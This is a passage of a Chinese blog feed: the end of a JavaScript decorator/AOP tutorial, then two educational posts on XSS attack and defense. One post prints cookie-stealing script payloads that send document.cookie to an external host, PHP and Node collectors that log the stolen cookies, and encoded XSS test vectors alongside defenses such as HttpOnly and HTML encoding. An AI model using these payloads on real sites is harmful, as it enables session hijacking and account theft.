class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>小T很快有了一个比较清晰的规划，我需要一个原函数（核心逻辑模块）和新函数（日志统计），我可以把”动态织入”的新函数作为参数传递，然后返回原函数和新函数的”代理”函数，然后执行，这样我不就可以在原函数之前执行新函数啦。既然Function.prototype.before里有原函数又有传递的新函数参数，新函数被执行后this的指向可能会被劫持，所以他想到了先保存一下原函数引用<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.before = fcuntion(beforefn)&#123;</span><br><span class="line">    <span class="keyword">let</span> _self = <span class="keyword">this</span>;  <span class="comment">//保存原函数的引用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;  <span class="comment">//返回包含了原函数和新函数的”代理“函数</span></span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后小T想，既然是before要让新函数在原函数之前执行，return function(){}我应该怎么处理可以让两个函数执行并且不会导致this被劫持呢，小T说如果我直接执行beforefn()，那么this指向会被劫持，小T想到apply/call可以很自然的控制/重写this值，以便定义调用函数时确定this指向哪个对象，决定用apply试试：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.before = fcuntion(beforefn)&#123;</span><br><span class="line">    <span class="keyword">let</span> _self = <span class="keyword">this</span>;  </span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        beforefn.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>); <span class="comment">// 执行新函数，且保证this不被劫持，新函数接受的参数会被原封不会的传入原函数，新函数在原函数之前执行</span></span><br><span class="line">        <span class="keyword">return</span> _self.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>) <span class="comment">//执行原函数并返回原函数执行结果，并保证this不被劫持</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这样就能在函数之前动态的增加功能了，写到这里，小T有些激动，心血来潮决定用同样的方法在函数后也增加功能，但是小T按照上面的方式导致了一系列问题，小T前思后想有些着急了，既然是在函数后增加新功能，让参数函数afterfn先执行显然是不正确的了，于是小T决定这样做：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.after = <span class="function"><span class="keyword">function</span>(<span class="params">afterfn</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> _self = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> ret = _self.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">        afterfn.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="高潮：漫卷诗书喜欲狂"><a href="#高潮：漫卷诗书喜欲狂" class="headerlink" title="高潮：漫卷诗书喜欲狂"></a>高潮：漫卷诗书喜欲狂</h1><p>终于下班啦，晚上回到家小T躺在沙发上敲着mac回想起以前经常需要在不修改源代码的情况下给函数增加新功能，他常规的做法会先预保存原引用，比如：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!-- 同事之前代码 --&gt;</span><br><span class="line"><span class="keyword">let</span> a = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;!-- 小T需要给a增加新功能 --&gt;</span><br><span class="line"><span class="keyword">let</span> _a = a;</span><br><span class="line">a = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    _a();</span><br><span class="line">    alert(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line">a();</span><br></pre></td></tr></table></figure></p><p>但是老大之前曾经告诉他，这虽然是一种符合开-闭原则常规的做法，但是因为总是需要维护_a()函数也许你会经常遇到_a()装饰链较长，装饰函数变多，中间变量数量也会越来越多，有时候还会遇到this被劫持。比如<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> _getElementById = <span class="built_in">document</span>.getElementById;</span><br><span class="line"><span class="built_in">document</span>.getElementById = <span class="function"><span class="keyword">function</span>(<span class="params"> id </span>)</span>&#123;</span><br><span class="line">    alert (<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> _getElementById( id ); <span class="comment">//Uncaught TypeError: Illegal invocation</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> button = <span class="built_in">document</span>.getElementById( <span class="string">'button'</span> );</span><br></pre></td></tr></table></figure></p><blockquote><p>在alert(1)弹出之后，控制台很明显的报了Uncaught TypeError: Illegal invocation的错误，异常就发生在_getElementById(id)这句话上，因为_getElementById是一个全局函数，this是指向window的，而document.getElementById的内部实现需要使用this引用，this在这个方法内的预期是指向document，而不是window，所以就产生了这样的错误。</p></blockquote><p>所以就需要手动把document当作上下文this传入_getElementById，常用的就是使用<code>call/apply</code>来改变this的指向，老大曾还直言不讳的告诉小T，对call/apply的掌握程度是可能间接性决定了你对JavaScript的精通度，于是小T便对call/apply针对性的理解练习和实践:<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> _getElementById = <span class="built_in">document</span>.getElementById;</span><br><span class="line"><span class="built_in">document</span>.getElementById = <span class="function"><span class="keyword">function</span>(<span class="params">id</span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> _getElementById.apply(<span class="built_in">document</span>,<span class="built_in">arguments</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> button = <span class="built_in">document</span>.getElementById(<span class="string">'button'</span>);</span><br></pre></td></tr></table></figure></p><p>但是这样的做法有些不方便，用AOP装饰函数可以很方便的解决这个问题，<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.before = <span class="function"><span class="keyword">function</span>(<span class="params">beforefn</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _self = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        beforefn.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">        <span class="keyword">return</span> _self.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.getElementById = <span class="built_in">document</span>.getElementById.before(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">1</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> button = <span class="built_in">document</span>.getElementById(<span class="string">'button'</span>);</span><br></pre></td></tr></table></figure></p><p>在试一个简单的栗子，利用<code>Function.prototype.after</code>来增加新的window.onload事件：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!-- 同事之前代码 --&gt;</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;!-- 需要新增加 --&gt;</span><br><span class="line"><span class="built_in">window</span>.onload = (<span class="built_in">window</span>.onload || <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;).after(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">2</span>);</span><br><span class="line">&#125;).after(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">3</span>);</span><br><span class="line">&#125;).after(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">4</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>就这样敲着敲着，窗外的夜变得寂静些许，只听到小Tcode code的键盘击打声，他抬头看了看墙上的钟表已经凌晨一点了，望了望窗外，月光洒在窗台，小T终于摸清楚了用AOP装饰函数的意图，但是小T有些不满足，因为在Function.prototype上添加before和after方法，是一种污染原型的方法，小T有些排斥，决定把新函数和原函数都作为参数传入before和after方法：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> before = <span class="function"><span class="keyword">function</span>(<span class="params">fn,beforefn</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        beforefn.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">        <span class="keyword">return</span> fn.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = before(</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="number">3</span>)&#125;,</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="number">2</span>)&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">a = before(a,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="number">1</span>);&#125;);  <span class="comment">//需要在a()之前增加新方法</span></span><br><span class="line">a();</span><br></pre></td></tr></table></figure></p><p>窗外的夜更深了，小T按下了关机键，还来不及摸到卧室，就已经慢慢的在沙发上闭上了眼睛，就这样伴随着墙上钟表滴答声，小T进入了梦乡。第二天睡眼惺忪的他揉了揉眼睛，开始了又一天的新生活…</p><p><strong>人物与故事纯属虚构</strong></p><h2 id="特别鸣谢"><a href="#特别鸣谢" class="headerlink" title="特别鸣谢"></a>特别鸣谢</h2><p>《JavaScript设计模式与开发实践》 -  AlloyTeam曾探</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS </tag>
            
            <tag> 装饰者模式 </tag>
            
            <tag> AOP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-浅谈xss攻防（二）</title>
      <link href="/2018/10/10/xss-attack-defense02-md/"/>
      <url>/2018/10/10/xss-attack-defense02-md/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上次介绍了什么是XSS以及XSS的三种类型，作为上次小尾巴的总结来说：XSS跨站脚本是一种经常出现在web应用程序中的计算机安全漏洞，是由于web应用程序对于用户的输入过滤不足引起的。攻击者利用网站漏洞把恶意脚本代码注入到网页之中，当其他用户浏览这些网页时，就会执行其中的恶意代码，轻者能达到恶作剧的目的，重者可以对受害者采取cookie资料窃取，会话劫持，钓鱼欺骗等各种攻击；分为三种类型，服务端的存储型和反射性，客户端自身漏洞引起的DOM型。这次我简单总结一些常见的攻击对应的防御措施，方便以后学习回顾;<br><a id="more"></a></p><h1 id="1-Cookie劫持"><a href="#1-Cookie劫持" class="headerlink" title="1.Cookie劫持"></a>1.Cookie劫持</h1><p>下面是几种是窃取用户Cookie信息的恶意代码，攻击者向漏洞页面写入类似的恶意代码从而达到获取客户端cookie信息的目的:</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location=<span class="string">"http://test.com/cookie.asp?cookie ='+document.cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://test.com/cookie.asp?cookie ='+document.cookie"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"><span class="keyword">new</span> Image().src=<span class="string">"http://test.com/cookie.asp?cookie ='+document.cookie"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">img=<span class="keyword">new</span> Image();img.src=<span class="string">"http://test.com/cookie.asp?cookie ='+document.cookie"</span>;img.wdith=<span class="number">0</span>;img.height=<span class="number">0</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">document.write('<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://test.com/cookie.asp?cookie ='+document.cookie"</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">height</span>=<span class="string">0</span> <span class="attr">border</span>=<span class="string">0</span>&gt;</span>')</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>诸如此类，一旦注入成功，这些恶意代码都会向某个特定的远程服务器提交cookie，攻击者会在远程服务器上写一个接收和记录cookie信息的文件<br>例如php版本：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $cookie=$_GET[<span class="string">'cookie'</span>];</span><br><span class="line">    $log= fopen(<span class="string">"cookie.txt"</span>,<span class="string">"a"</span>);</span><br><span class="line">    fwrite($log,$cookie .<span class="string">"\n"</span>);</span><br><span class="line">    fclose($log);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>或者node来处理:<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> Cookies = &#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    req.headers.cookie &amp;&amp; req.headers.cookie.split(<span class="string">';'</span>).foEach(<span class="function"><span class="keyword">function</span>(<span class="params">Cookies</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> parts = Cookie.split(<span class="string">'='</span>);</span><br><span class="line">        Cookies[ parts[ <span class="number">0</span> ].trim() ] = ( parts[ <span class="number">1</span> ] || <span class="string">''</span> ).trim();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(Cookies)</span><br><span class="line"></span><br><span class="line">    res.writeHeader(<span class="number">200</span>,&#123;</span><br><span class="line">        <span class="string">'Set-Cookie'</span> : <span class="string">'SSID=EqAc1D; Expires=Wed'</span>, </span><br><span class="line">        <span class="comment">// 注意上面我们不设置HttpOnly;Fix:&gt;&gt;&gt;'SSID=EqAc1D; Expires=Wed;HttpOnly'&lt;&lt;&lt;</span></span><br><span class="line"><span class="string">'Content-Type'</span> : <span class="string">'text/plain'</span></span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    fs.open(<span class="string">'cookie.txt'</span>,<span class="string">'r+'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,fd</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</span><br><span class="line">        &#125;</span><br><span class="line">        fs.writeFile(fd,Cookies,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(err)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;).listen(<span class="number">8000</span>);</span><br></pre></td></tr></table></figure></p><p>亦或是jsp版本、python flask等等诸如此类可以获取到从客户端发来的cookie做接收和记录操作的。</p><p>获取到存储信息的cookie.txt后，攻击者就可以通过修改网站的cookie信息（f12打开开发者控制工具，application/Cookies）来登入网站，从而来进行进一步的攻击操作。</p><h2 id="防止cookie会话劫持"><a href="#防止cookie会话劫持" class="headerlink" title="防止cookie会话劫持"></a>防止cookie会话劫持</h2><p>根本原因是攻击者获取cookie的恶意js代码注入到站点，进一步传到攻击者的远程服务器，从而进行攻击操作；<br>对于可能的意外注入站点的获取cookie的恶意js代码，我们一般要在设置cookie时加HttpOnly，来禁止意外注入站点的恶意js代码操作Cookie造成xss攻击<br>比如node设置HttpOnly：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">'Set-Cookie'</span> : <span class="string">'SSID=EqAc1D; Expires=Wed ;HttpOnly'</span></span><br></pre></td></tr></table></figure></p><p>或者php设置HttpOnly：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> ini_set(<span class="string">"session.cookie_httponly"</span>, <span class="number">1</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="2-提高攻击门槛"><a href="#2-提高攻击门槛" class="headerlink" title="2.提高攻击门槛"></a>2.提高攻击门槛</h1><h2 id="使用XSS-Filter"><a href="#使用XSS-Filter" class="headerlink" title="使用XSS Filter"></a>使用XSS Filter</h2><p>针对用户提交的数据进行有效的验证，只接受我们规定的长度或内容的提交，过滤掉其他的输入内容，例如：<br>1.表单数据指定值的类型：年龄只能是 int 、name 只能是字母数字等<br>2.过滤或移除特殊的 html 标签：<code>&lt;script&gt;</code>、<code>&lt;iframe&gt;</code>等<br>3.过滤 js 事件的标签：onclick、onerror、onfocus等<br>4.对于要求用户输入的一些特殊格式的字段，用正则和字段长度进行严格限制，比如手机号，邮箱等<br>如在客户端进行验证手机号的JavaScript代码:<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form id=<span class="string">"test"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> id=<span class="string">"tel"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"button"</span> onclick=<span class="string">"checkTel()"</span>&gt; </span><br><span class="line">&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">    function()&#123;</span></span><br><span class="line"><span class="regexp">        let re = /</span>^<span class="number">020</span>-\d&#123;<span class="number">8</span>&#125;$/;</span><br><span class="line">        <span class="keyword">if</span>(re.test(<span class="built_in">document</span>.getElementById(<span class="string">"Tel"</span>).value))&#123;</span><br><span class="line">            alert(<span class="string">'电话号码格式正确'</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            alert(<span class="string">'错误的电话号码'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p><p>这段JavaScript验证代码要求用户输入的必须是020-开头，后跟8位数字.</p><blockquote><p>但是需要特别注意的是，<em>仅仅在客户端进行非法输入的验证和检测是远远不够的</em>，因为客户端组件和用户输入不在服务器的控制范围内，用户能够完全控制客户端及提交的数据，比如firebug、TemperDate之类的工具，拦截应用程序收到和发布每一个HTTP/HTTPS请求和响应，对其进行修改和检查，从而绕过客户端的检验将信息提交到服务器中。因此，确认客户端生成数据的唯一安全方法就是在服务端实施保护措施。</p></blockquote><h2 id="输出编码Xss-Escape"><a href="#输出编码Xss-Escape" class="headerlink" title="输出编码Xss Escape"></a>输出编码Xss Escape</h2><p>有时候我们又不可避免的需要用户输入一些特殊字符，但是我们又不确定用户输入的这段含特殊字符的数据是不是恶意的含xss的字符，为了保证用户输入的完整性和正确性，就可以使用编码（HTMLEncode）进行处理。</p><p>HTML编码在防止xss攻击上能起很大的作用，它主要使用对应的实体代替HTML字符，让该字符作为其HTML文档的内容而非结构加以处理。</p><table><thead><tr><th style="text-align:center">显示</th><th style="text-align:center">实体名字</th><th style="text-align:center">实体编号</th></tr></thead><tbody><tr><td style="text-align:center"><code>&lt;</code></td><td style="text-align:center"><code>&amp;lt;</code></td><td style="text-align:center"><code>&amp;#60;</code></td></tr><tr><td style="text-align:center"><code>&gt;</code></td><td style="text-align:center"><code>&amp;gt;</code></td><td style="text-align:center"><code>&amp;#62;</code></td></tr><tr><td style="text-align:center"><code>&amp;</code></td><td style="text-align:center"><code>&amp;amp;</code></td><td style="text-align:center"><code>&amp;#38;</code></td></tr><tr><td style="text-align:center"><code>&quot;</code></td><td style="text-align:center"><code>&amp;quot;</code></td><td style="text-align:center"><code>&amp;#34;</code></td></tr></tbody></table><p>上面就是几个可能触发xss的敏感字符，都是一些特殊的HTML字符。都这些字符实现编码和转义后，能够有效地防范HTML注入和XSS攻击</p><p>例如php的<code>htmlspecialchars()</code>库函数，就能够将用户输入的特殊字符进行实体转换：</p><ul><li><code>&lt;</code> 转成 <code>&amp;lt;</code></li><li><code>&gt;</code> 转成 <code>&amp;gt;</code></li><li><code>&amp;</code> 转成 <code>&amp;amp;</code></li><li><code>&quot;</code> 转成 <code>&amp;quot;</code></li><li><code>&#39;</code> 转成 <code>&amp;#39;</code></li></ul><p>实际情况中，我们可以结合这两种情况进行过滤<br><img src="/assets/images/xss-encode02.png" alt="安全的过滤形式"></p><h1 id="3-Xss漏洞检测Poc"><a href="#3-Xss漏洞检测Poc" class="headerlink" title="3.Xss漏洞检测Poc"></a>3.Xss漏洞检测Poc</h1><p>标准的xss漏洞检测代码<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p><p>img 图片标记属性跨站攻击代码<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"javascript:alert(/xss/)"</span>&gt;&lt;/img&gt; &lt;img <span class="attribute">dynsrc</span>=<span class="string">"javascript:alert('xss')"</span>&gt;</span><br></pre></td></tr></table></figure></p><p>无需 “&lt;&gt;”，利用 html 标记事件属性跨站<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">""</span> <span class="attribute">onerror</span>=alert("xss")&gt;</span><br></pre></td></tr></table></figure></p><p>空格与回车符转换<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"Jav&amp;#x09;ascript:alert('xss')"</span>&gt; &lt;img <span class="attribute">src</span>=<span class="string">"Jav&amp;#x0A;ascript:alert('xss')"</span>&gt; &lt;img <span class="attribute">src</span>=<span class="string">"Jav&amp;#x0D;ascript:alert('xss')"</span>&gt;</span><br></pre></td></tr></table></figure></p><p>10 进制转换<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"&amp;#74&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#39&amp;#120&amp;#115&amp;#115&amp;#39&amp;#41"</span>&gt;</span><br></pre></td></tr></table></figure></p><p>以上代码都可以做 Poc 使用，在有变量的位置插入，如果成功执行则代表有漏洞。<br>只要你提交的Poc，服务端原封不动的返回了，说明服务端不经过任何处理就显示了，就证明有漏洞存在。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://book.douban.com/subject/25711796/" target="_blank" rel="noopener">《XSS跨站脚本剖析与防御》–邱永华</a><br><a href="https://book.douban.com/subject/10546925/" target="_blank" rel="noopener">《白帽子讲web安全》–吴翰清</a><br><a href="https://blog.csdn.net/gitchat/article/details/78726803" target="_blank" rel="noopener">《Web 安全：前端攻击 XSS 深入解析》</a></p>]]></content>
      
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-浅谈xss攻防（一）</title>
      <link href="/2018/10/09/xss-attack-defense-md/"/>
      <url>/2018/10/09/xss-attack-defense-md/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>近来反反复复读了一些xss和csrf攻防的一些文章，大体上读完了《XSS跨站脚本剖析与防御》这本书，之前浅浮的以为xss仅仅需要对用户输入内容进行过滤，然而现在重新审视xss的攻击技巧着实令人眼花缭乱。</p><p>那到底什么是xss跨站脚本呢？它会造成什么危害？为何它如此流行？它的攻击方式有哪些？作为web开发人员我们应该做的有哪些？</p><p>带着这几个问题，反复测试总结了这篇文章，一方面方便自己以后学习回顾，另一方面希望可以帮助到一些想对xss攻防有些了解的人，我相信这篇文章能够帮你理解上面几个问题。想要深入学习，建议还是去学习<a href="https://read.douban.com/ebook/12812565/" target="_blank" rel="noopener">《xss跨站脚本剖析与防御》</a>，这本书是邱永华先生所著，阿里首席安全研究员吴翰清作的序，细细读来定能有所收获；<br><a id="more"></a></p><h1 id="XSS背景与介绍"><a href="#XSS背景与介绍" class="headerlink" title="XSS背景与介绍"></a>XSS背景与介绍</h1><h2 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h2><p>随着互联网的发展，web2.0时代的兴起，带来的交互模式的发展，现如今更是向融合人工智能的web3.0发展。目前的网站绝大多数都有需要和用户交互的功能，比如电商网站的评论，论坛的发帖，微博网站的转发等等。</p><p>正常用户会中规中矩的使用，但是对于黑客他们也许不会循规蹈矩，他们可以通过这些表单提交一些恶意代码，通常是JavaScript（但是绝对不限与此，也包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML）一旦攻击成功后，攻击者可能获得更高的权限（可能的一些操作）、私密的网页内容、会话和cookie等等</p><p>不过目前现代浏览器比如chrome，firefox对于表单中的代码会自动检测出xss，从而屏蔽请求，但仍然不是绝对安全的，与此同时不乏有一些浏览器如IE6,7,8并不会做这样的处理，亲测如此；chrome的xss过滤器叫做xssAuditor，IE的xss过滤xssFilter从IE8 beta2才开始，所以IE8及以下的浏览器不会做xss过滤处理，关于xssAuditor和xssFilter两者的区别，吴翰清大神所著的《白帽子讲web安全》有详细的介绍，</p><blockquote><p>作为扩展简单的说，ie的xss检测相对粗暴，在系统盘的mshtml.dll中，是基于正则进行检测的；<br>而chrome的xssAuditor的整合在webkit中，任何使用webkit内核的都可以使用这些规则，在词法解析阶段进行，和html解析不同的token，xssAuditor会逐一扫描并检测token，token中发现危险的属性和URL进行比较，如果URL中也存在同样的数据，xssAuditor则会认为是一个反射型xss。</p></blockquote><p>下面通过一个很简单的栗子说明：textarea中的一段<code>&lt;script&gt;alert(/XSS/)&lt;/script&gt;</code>很简单的恶意代码，如果前后端和浏览器的xss检测都跳过，那么这段代码就会伴随请求被上传到漏洞服务器或者客户端中，站点从数据库中或者客户端读取恶意用户存入的非法数据，然后显示在页面，在受害者主机上的浏览器执行恶意代码，那么这个xss就会成功（其实就是让用户打开这个页面弹个屏的小恶作剧），但是这里就如同上面说的那样chrome的xssAuditor帮我们检测出了异常代码，从而拦截了这个网页，阻止了这个恶作剧的发生，我们把这种注入到服务器或者客户端的恶意代码的xss攻击方式称为持久性（又叫存储型）XSS</p><video src="https://www.chenqaq.com/assets/videos/xss01.mp4" controls allowfullscreen="true" loop="true" autoplay="autoplay" width="100%" min-height="100%">embed: xss–chrome_test</video><h2 id="XSS的分类"><a href="#XSS的分类" class="headerlink" title="XSS的分类"></a>XSS的分类</h2><p>根据攻击的来源不同，我们通常分为三种：反射型，存储型和比较特殊的DOM型（DOM-Based XSS）</p><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>反射型：反射性通常发生在URL地址的参数中，常用来窃取客户端的cookie或进行钓鱼欺骗，经常在网站的搜索栏，跳转的地方被注入；<br>比如：<br><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">http://www.test.<span class="keyword">com</span>/<span class="built_in">search</span>.php?key=<span class="string">"&gt;&lt;script&gt;alert("</span>XSS<span class="comment">")&lt;/script&gt;</span></span><br><span class="line">http://www.test.<span class="keyword">com</span>/logout.asp?out=<span class="keyword">l</span>$url=javascrip<span class="variable">t:alert</span>(document.cookie)</span><br></pre></td></tr></table></figure></p><p>我们发现URL后本来应该是正常的键值对key=value，却被注入了一段恶意代码（即构造了一个其中包含恶意代码的特殊的url），应该慎用get请求，对隐秘的信息则是避免，get请求的键值会被暴露在URL中；POST的内容也会触发反射型XSS，不过触发条件相对苛刻。</p><p>当然如果地址栏看到上面两个URL，可能被轻易的看穿该链接是不可信的，但是绝不要小瞧此类XSS的威力，一般黑客都会进行精心布置，恶意URL暴露一般会进行各种编码转化，编码转换后，攻击的迷惑性大大提高<br><img src="https://www.chenqaq.com/assets/images/xss-encode01.png" alt=""></p><h3 id="持久型（又叫存储型）"><a href="#持久型（又叫存储型）" class="headerlink" 